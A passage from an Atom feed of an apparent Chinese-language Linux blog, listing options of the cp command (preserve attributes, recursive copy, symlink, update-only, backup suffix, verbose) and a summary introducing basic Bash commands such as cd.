</p><p>-p：保留源文件或目录的属性； </p><p>-R/r：递归处理，将指定目录下的所有文件与子目录一并处理； </p><p>-s：对源文件建立符号连接，而非复制文件； </p><p>-u：使用这项参数后只会在源文件的更改时间较目标文件更新时或是名称相互对应的目标文件并不存在时，才复制文件； </p><p>-S：在备份文件时，用指定的后缀“SUFFIX”代替文件的默认后缀； </p><p>-b：覆盖已存在的文件目标前将目标文件备份； </p><p>-v：详细显示命令执行的操作。 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在这里展示是Linux shell命令最基础的部分(&lt;strong&gt;Bash Shell&lt;/strong&gt;)，却也是最重要的部分。&lt;/p&gt;
&lt;h2 id=&quot;cd命令&quot;&gt;&lt;a href=&quot;#cd命令&quot; class=&quot;headerlink&quot; title=&quot;cd命令&quot;&gt;&lt;/a&gt;c</summary>
      
    
    
    
    <category term="Linux" scheme="http://jacen-cpu.github.io/categories/Linux/"/>
    
    
  </entry>
  
</feed>
